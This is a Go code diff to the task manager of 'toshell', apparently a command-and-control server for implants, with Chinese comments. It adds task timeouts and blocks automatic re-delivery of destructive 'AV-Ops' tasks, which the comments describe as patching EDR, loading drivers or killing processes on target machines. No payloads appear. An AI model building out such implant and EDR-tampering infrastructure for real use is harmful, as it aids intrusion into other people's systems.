@@ -7,6 +7,7 @@ import (
 	"sync/atomic"
 	"time"
 
+	"toshell/internal/common/avops"
 	"toshell/internal/common/types"
 	"toshell/internal/server/avdetect"
 	"toshell/internal/server/database"
@@ -698,6 +699,52 @@ func (m *Manager) Fail(id uint64, errorMsg string) error {
 	return nil
 }
 
+// Expire 把一条仍未终结的任务标记为 timeout（服务端侧超时收口，v1.4.0 S6）。
+//
+// 为什么需要它：在 S6 之前，服务端**从不**把任务置为 timeout —— StatusTimeout 只作为
+// "读取侧判断出现"（见 wait.go 的终态判定）。于是"服务端认定这次下发超时了"这件事
+// 没有落点：任务永远停在 sent，操作员在任务列表里看不到结论，Agent 的等待方也只能
+// 靠自己的超时收场。AV-Ops 的显式超时（timeout_sec）要的正是这个可判定结论。
+//
+// 它同时是"破坏性任务禁止自动重试"的**第二条独立保证**：ListReplayable/RequeueSent
+// 只看 pending/sent，任务一旦进入终态（timeout 也是终态）就天然不会被自动重投递。
+// 也就是说，哪怕将来有人新增了一条重投递路径却忘了调 avops.TaskNoRetry，
+// "已经判定超时的任务"依然不会被重发。
+func (m *Manager) Expire(id uint64, reason string) error {
+	m.mu.Lock()
+	defer m.mu.Unlock()
+
+	task, ok := m.lookupLocked(id)
+	if !ok {
+		return fmt.Errorf("task not found: %d", id)
+	}
+	// 终态去重：已完成/已失败/已超时的任务不允许被改写成 timeout
+	// （结果帧与超时看门狗会并发到达，谁先到谁说话）。
+	if task.Status == StatusCompleted || task.Status == StatusFailed || task.Status == StatusTimeout {
+		return nil
+	}
+
+	task.Status = StatusTimeout
+	task.Error = reason
+	now := time.Now()
+	task.CompletedAt = &now
+
+	m.completed = append(m.completed, task)
+	m.removeFromPending(id)
+
+	db := database.Get()
+	if db != nil {
+		db.UpdateTask(task)
+	}
+
+	// 终态变更点：唤醒等待者（Agent 的 task_wait 等会立刻拿到"超时"结论，
+	// 而不是各自挂满自己的超时）。
+	m.notifyLocked(id)
+
+	logging.Warn("task", "Task %d expired: %s", id, reason)
+	return nil
+}
+
 // UpdateProgress 更新任务传输进度（0-100），不改变状态。
 // 大文件下载/上传分块直传时由监听器随帧调用，前端据此显示进度条。
 func (m *Manager) UpdateProgress(id uint64, progress int) error {
@@ -788,18 +835,37 @@ func (m *Manager) ClearTransfer(taskID uint64) {
 // ListReplayable 返回指定会话中"应补发"的任务：
 // pending（尚未派发）与 sent（已派发但未收到结果，可能因断连丢失）。
 // completed/failed/timeout 等终态任务不补发。会话热迁移（重连续传）使用。
+//
+// ⚠️ **破坏性任务（AV-Ops L1 起）不在此列**（v1.4.0 S6）：
+// 判定依据是任务类型（avops.TaskNoRetry），见下方循环里的注释 —— 这里是"断线重连补发"
+// 这条自动重投递路径的唯一出口（TCP/WS/MQTT 三个监听器的热迁移都走本函数）。
 func (m *Manager) ListReplayable(sessionID string) []*types.TaskInfo {
 	m.mu.RLock()
 	defer m.mu.RUnlock()
 
 	var out []*types.TaskInfo
+	skipped := 0
 	for _, task := range m.tasks {
 		if task.SessionID != sessionID {
 			continue
 		}
-		if task.Status == StatusPending || task.Status == StatusSent {
-			out = append(out, task)
+		if task.Status != StatusPending && task.Status != StatusSent {
+			continue
 		}
+		// 破坏性动作**禁止自动重投递**：断线重连补发是"同一个 task ID 再送一次"，
+		// 而植入端的结果缓存会在每次新连接时清空（见 implant main.go 的 clearResultCache 注释），
+		// 因此重发 = 再执行一次（二次 patch EDR / 二次加载驱动 / 二次杀进程）。
+		// 宁可让操作员在排障入口看到"这条任务没有补发，请确认后再下发一次（新 task ID）"，
+		// 也不要赌"植入端可能已经执行过了"。
+		if avops.TaskNoRetry(task.TaskType) {
+			skipped++
+			continue
+		}
+		out = append(out, task)
+	}
+	if skipped > 0 {
+		logging.Warn("task", "会话 %s 有 %d 条破坏性在途任务未补发（禁止自动重投递，"+
+			"请确认执行结果后再决定是否重新下发）", sessionID, skipped)
 	}
 	return out
 }
@@ -808,18 +874,42 @@ func (m *Manager) ListReplayable(sessionID string) []*types.TaskInfo {
 // 供轮询通道（HTTP）在心跳时再次下发（断连导致结果丢失的重试）。
 // 仅重入队超过 staleAfter 仍无结果的任务（防止长任务执行中被打断重复派发）。
 // 返回被重新入队的任务数。
+//
+// 保留这个签名是为了不动既有调用点（internal/server/listener/http_polling.go）；
+// 需要知道"有多少条被拒绝重投递"时用 RequeueSentEx。
 func (m *Manager) RequeueSent(sessionID string, staleAfter time.Duration) int {
+	requeued, _ := m.RequeueSentEx(sessionID, staleAfter)
+	return requeued
+}
+
+// RequeueSentEx 是 RequeueSent 的扩展版：额外返回因"破坏性任务禁止自动重试"而被
+// **拒绝重投递**的任务数（v1.4.0 S6）。
+//
+// 为什么单独返回被拒条数：这条路径的失败是"静默的"——任务停在 sent，操作员看不到
+// 任何错误。把条数暴露出来，既能在日志里给出解释，也能让单测直接断言
+// "重投递被拒绝"而不是"碰巧没重投递"。
+//
+// ⚠️ 被拒的任务**保持 sent 状态**，不改成 failed/timeout：我们并不知道植入端有没有
+// 执行过它（结果可能只是丢在回程上）。擅自改成终态会让操作员误以为"没执行"，
+// 从而重新下发 —— 那正是这条保护要避免的事。它们最终会由 CleanupOldTasks 按时间回收。
+func (m *Manager) RequeueSentEx(sessionID string, staleAfter time.Duration) (requeued, refused int) {
 	m.mu.Lock()
 	defer m.mu.Unlock()
 
 	now := time.Now()
-	var requeued int
 	for _, task := range m.tasks {
 		if task.SessionID != sessionID || task.Status != StatusSent {
 			continue
 		}
 		if task.SentAt != nil && now.Sub(*task.SentAt) < staleAfter {
 			continue // 刚派发不久，植入端可能仍在执行
+		}
+		// 破坏性动作**禁止自动重投递**（HTTP 轮询通道这条路径）。
+		// 与 ListReplayable 用同一个判定（avops.TaskNoRetry），保证两条路径口径一致：
+		// 只堵一条会让"换个通道就重发"成为漏网。
+		if avops.TaskNoRetry(task.TaskType) {
+			refused++
+			continue
 		}
 		task.Status = StatusPending
 		// 防重复入队
@@ -835,10 +925,14 @@ func (m *Manager) RequeueSent(sessionID string, staleAfter time.Duration) int {
 		}
 		requeued++
 	}
+	if refused > 0 {
+		logging.Warn("task", "会话 %s 有 %d 条破坏性任务已超期无结果，但**拒绝自动重投递**"+
+			"（重发=再执行；请确认目标机现状后自行重新下发，会分配新的 task ID）", sessionID, refused)
+	}
 	if requeued > 0 {
 		logging.Debug("task", "Requeued %d stale sent task(s) for session %s", requeued, sessionID)
 	}
-	return requeued
+	return requeued, refused
 }
 
 func (m *Manager) ListPending() []*types.TaskInfo {
